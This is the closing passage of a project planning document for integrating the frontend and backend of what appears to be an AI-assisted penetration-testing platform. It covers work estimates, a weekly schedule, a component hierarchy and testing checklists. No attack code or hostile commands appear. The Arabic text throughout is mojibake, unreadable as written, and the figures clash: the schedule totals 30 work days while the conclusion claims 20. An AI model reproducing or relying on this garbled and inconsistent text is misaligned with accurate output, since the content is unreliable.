**Ø§Ù„Ù…Ø¬Ù…ÙˆØ¹**: +4 Ø£ÙŠØ§Ù… Ø¹Ù…Ù„

#### Ø§Ù„Ø£ÙˆÙ„ÙˆÙŠØ© Ø§Ù„Ù…ØªÙˆØ³Ø·Ø© (Medium)
8. **Knowledge Base Browser** (4-5 Ø£ÙŠØ§Ù…)
9. **Advanced Features** (FiltersØŒ SearchØŒ Export) (3-4 Ø£ÙŠØ§Ù…)

**Ø§Ù„Ù…Ø¬Ù…ÙˆØ¹**: +8 Ø£ÙŠØ§Ù… Ø¹Ù…Ù„

#### Ù‚Ø¨Ù„ Ø§Ù„Ø¥Ù†ØªØ§Ø¬ (Production)
10. **Authentication & Authorization** (3-4 Ø£ÙŠØ§Ù…)
11. **Performance Optimization** (2-3 Ø£ÙŠØ§Ù…)
12. **Testing & Documentation** (2-3 Ø£ÙŠØ§Ù…)

**Ø§Ù„Ù…Ø¬Ù…ÙˆØ¹**: +8 Ø£ÙŠØ§Ù… Ø¹Ù…Ù„

**Ø¥Ø¬Ù…Ø§Ù„ÙŠ Ø§Ù„ÙˆÙ‚Øª Ø§Ù„Ù…Ù‚Ø¯Ø± Ù„Ù„ØªÙƒØ§Ù…Ù„ Ø§Ù„ÙƒØ§Ù…Ù„**: 30 ÙŠÙˆÙ… Ø¹Ù…Ù„ (~6 Ø£Ø³Ø§Ø¨ÙŠØ¹)

### 11.3 Ø§Ù„Ø®Ø·ÙˆØ§Øª Ø§Ù„ØªØ§Ù„ÙŠØ©

1. **Ø£Ø³Ø¨ÙˆØ¹ 1**: Core Integration
   - ØªÙ†ÙÙŠØ° API Client ÙƒØ§Ù…Ù„
   - ØªÙØ¹ÙŠÙ„ WebSocket
   - Ø±Ø¨Ø· Mission Store

2. **Ø£Ø³Ø¨ÙˆØ¹ 2**: UI Integration
   - Ø±Ø¨Ø· AIChatPanel
   - Ø±Ø¨Ø· Mission Controls
   - Ø±Ø¨Ø· Approval Workflow

3. **Ø£Ø³Ø¨ÙˆØ¹ 3**: Advanced Features
   - Knowledge Base Browser
   - Terminal Integration
   - Polish & UX improvements

4. **Ø£Ø³Ø¨ÙˆØ¹ 4**: Production Readiness
   - Security implementation
   - Performance optimization
   - Testing & documentation

5. **Ø£Ø³Ø¨ÙˆØ¹ 5-6**: Buffer & Refinement
   - Bug fixes
   - Performance tuning
   - User acceptance testing

---

## Ø§Ù„Ù…Ù„Ø§Ø­Ù‚

### Appendix A: API Endpoint Reference

Ø§Ù†Ø¸Ø± Ø§Ù„Ù‚Ø³Ù… 3 Ù„Ø¬Ù…ÙŠØ¹ Ù†Ù‚Ø§Ø· Ø§Ù„Ø§ØªØµØ§Ù„ API Ù…Ø¹ Ø£Ù…Ø«Ù„Ø© Request/Response ÙƒØ§Ù…Ù„Ø©.

### Appendix B: WebSocket Event Reference

Ø§Ù†Ø¸Ø± Ø§Ù„Ù‚Ø³Ù… 4 Ù„Ø¬Ù…ÙŠØ¹ Ø£Ù†ÙˆØ§Ø¹ Ø£Ø­Ø¯Ø§Ø« WebSocket Ù…Ø¹ Ø£Ù…Ø«Ù„Ø© JSON ÙƒØ§Ù…Ù„Ø©.

### Appendix C: Data Models Reference

Ø§Ù†Ø¸Ø± Ø§Ù„Ù‚Ø³Ù… 5 Ù„Ø¬Ù…ÙŠØ¹ Ù†Ù…Ø§Ø°Ø¬ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª ÙÙŠ Backend Ùˆ Frontend.

### Appendix D: Component Hierarchy

```
Operations Page
â”œâ”€â”€ MissionControls (Start/Stop/Pause buttons)
â”œâ”€â”€ StatisticsCards (Target count, Vuln count, etc.)
â””â”€â”€ DualPanelLayout
    â”œâ”€â”€ AIChatPanel (Left)
    â”‚   â”œâ”€â”€ EventCard (multiple)
    â”‚   â”œâ”€â”€ ApprovalCard (when pending)
    â”‚   â”œâ”€â”€ AIPlanCard (AI plans)
    â”‚   â”œâ”€â”€ ArtifactCard (discovered data)
    â”‚   â””â”€â”€ ChatInput
    â””â”€â”€ TerminalPanel (Right)
        â””â”€â”€ Terminal Output Display
```

### Appendix E: Testing Checklist

#### Backend Testing
- [ ] All API endpoints return correct data
- [ ] WebSocket events are broadcasted correctly
- [ ] Specialists discover targets/vulns correctly
- [ ] HITL approval workflow functions
- [ ] Chat system works end-to-end

#### Frontend Testing
- [ ] Mission creation works
- [ ] Mission control buttons function
- [ ] WebSocket connection is stable
- [ ] Events appear in real-time
- [ ] Approval workflow interactive
- [ ] Statistics update correctly
- [ ] Terminal shows real output
- [ ] Knowledge base browser works

#### Integration Testing
- [ ] End-to-end mission flow
- [ ] Real-time updates work
- [ ] Error handling works
- [ ] Reconnection works
- [ ] Performance is acceptable

---

## Ø§Ù„Ø®Ø§ØªÙ…Ø©

Ù‡Ø°Ø§ Ø§Ù„ØªÙˆØ«ÙŠÙ‚ ÙŠÙ…Ø«Ù„ **Ø®Ø±ÙŠØ·Ø© ØªÙƒØ§Ù…Ù„ ÙƒØ§Ù…Ù„Ø©** ØªØºØ·ÙŠ:

âœ… **Ø§Ù„Ø¨Ø§Ùƒ Ø§ÙŠÙ†Ø¯ Ø¨Ø§Ù„ØªÙØµÙŠÙ„**: 51 Ù…Ù„Ù PythonØŒ 30,000+ Ø³Ø·Ø± ÙƒÙˆØ¯ØŒ Ø¬Ù…ÙŠØ¹ API endpointsØŒ WebSocket events  
âœ… **Ø§Ù„ÙØ±ÙˆÙ†Øª Ø§ÙŠÙ†Ø¯ Ø¨Ø§Ù„ØªÙØµÙŠÙ„**: 82 Ù…Ù„Ù TypeScriptØŒ Ø§Ù„Ù…ÙƒÙˆÙ†Ø§ØªØŒ State management  
âœ… **Ù†Ù‚Ø§Ø· Ø§Ù„ØªÙƒØ§Ù…Ù„**: ÙƒÙ„ API endpoint Ù…Ø¹ Request/ResponseØŒ ÙƒÙ„ WebSocket event Ù…Ø¹ JSON examples  
âœ… **Ø§Ù„ÙØ¬ÙˆØ§Øª Ø§Ù„Ù…Ø­Ø¯Ø¯Ø©**: ØªØ­Ù„ÙŠÙ„ Ø¯Ù‚ÙŠÙ‚ Ù„Ù…Ø§ Ù‡Ùˆ Ù…ÙÙ‚ÙˆØ¯ ÙˆÙ…Ø§ ÙŠØ­ØªØ§Ø¬ Ø¹Ù…Ù„  
âœ… **Ø®Ø·Ø© Ø§Ù„Ø¹Ù…Ù„**: 4 Ù…Ø±Ø§Ø­Ù„ØŒ 20 ÙŠÙˆÙ… Ø¹Ù…Ù„ØŒ Ø®Ø·ÙˆØ§Øª ÙˆØ§Ø¶Ø­Ø© ÙˆÙ…ÙØµÙ„Ø©  
âœ… **Ù…ØªØ·Ù„Ø¨Ø§Øª Ø§Ù„Ø¥Ù†ØªØ§Ø¬**: SecurityØŒ PerformanceØŒ ReliabilityØŒ Monitoring  

**Ø§Ù„Ø¢Ù† Ø§Ù„ÙØ±ÙŠÙ‚ Ù„Ø¯ÙŠÙ‡ Ø®Ø±ÙŠØ·Ø© ÙˆØ§Ø¶Ø­Ø© ÙˆØ´Ø§Ù…Ù„Ø© Ù„Ù„ØªØ­Ø±Ùƒ Ù…Ù† Demo Ø¥Ù„Ù‰ Production.**

---

**ØªÙ… Ø¨Ø­Ù…Ø¯ Ø§Ù„Ù„Ù‡**  
**ØªØ§Ø±ÙŠØ® Ø§Ù„Ø¥Ù†Ø´Ø§Ø¡**: 2026-01-03  
**Ø§Ù„Ø¥ØµØ¯Ø§Ø±**: 1.0.0  
**Ø§Ù„Ø­Ø§Ù„Ø©**: ÙƒØ§Ù…Ù„ ÙˆØ¬Ø§Ù‡Ø² Ù„Ù„ØªÙ†ÙÙŠØ°

